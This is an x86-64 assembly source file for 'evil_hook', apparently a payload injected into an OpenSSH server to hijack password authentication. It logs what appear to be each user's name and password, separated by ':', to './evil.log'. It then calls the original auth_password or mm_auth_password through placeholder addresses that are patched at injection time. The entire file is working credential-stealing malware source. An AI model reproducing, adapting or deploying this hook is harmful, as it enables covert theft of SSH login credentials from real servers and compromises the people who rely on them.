.global evil_hook, evil_hook_size

hook_start:

	push %rbp
	push %rbx

	push %rdi
	push %rdx
	push %rcx
	push %r8
	push %r9
	push %rsi
	push %rdi

	# SC_open
	mov $2, %rax
	lea logpath(%rip), %rdi	
	# O_CREAT | O_APPEND | O_RDWR
	mov $0x442, %rsi
	mov $0666, %rdx
	syscall
	
	pop %rdi
	mov 0x20(%rdi), %rdi
	call write_string

	lea delim(%rip), %rdi
	call write_string

	mov %rbx, %rdi
	call write_string

	lea newline(%rip), %rdi
	call write_string

	# close(fd)
	mov %rax, %rdi
	mov $3, %rax
	syscall

	pop %rsi
	pop %r9
	pop %r8
	pop %rcx
	pop %rdx
	pop %rdi

	# check use_privsep for the right function to call
	mov $0x1111111122222222, %rax
	mov (%rax), %eax
	test %eax, %eax
	jne call_mm_auth_passwd

# call auth_password(authctxt, password)	
call_auth_passwd:
	mov $0x3333333344444444, %rax 
	jmp do_call

# call mm_auth_password(authctxt, password)
call_mm_auth_passwd:
	mov $0x5555555566666666, %rax

do_call:
	call *%rax
	
	pop %rbx
	pop %rbp
	ret

# rax=fd
# rdi=str_ptr
write_string:
	push %rax

	# get len
	mov %rdi, %rax
	call strlen

	mov %rdi, %rsi # buf_ptr
	pop %rdi # fd
	push %rdi
	mov %rax, %rdx

	mov $1, %rax  # SC_write
	syscall

	pop %rax
ret

strlen:
	push %rdi
	push %rsi
	push %rcx

	mov %rax, %rsi
	mov $0, %rax

	len_loop:
		mov %rsi, %rcx
		add %rax, %rcx
		movb (%rcx), %dl

		cmp $0, %dl
		jz strlen_done

		inc %rax
	jmp len_loop

strlen_done:
	pop %rcx
	pop %rsi
	pop %rdi

	ret


logpath:
	.string "./evil.log"

delim:
	.string ":"

newline:
	.string "\n"
	
evil_hook_size:
.quad	(evil_hook_size - hook_start)
evil_hook:
.quad	hook_start

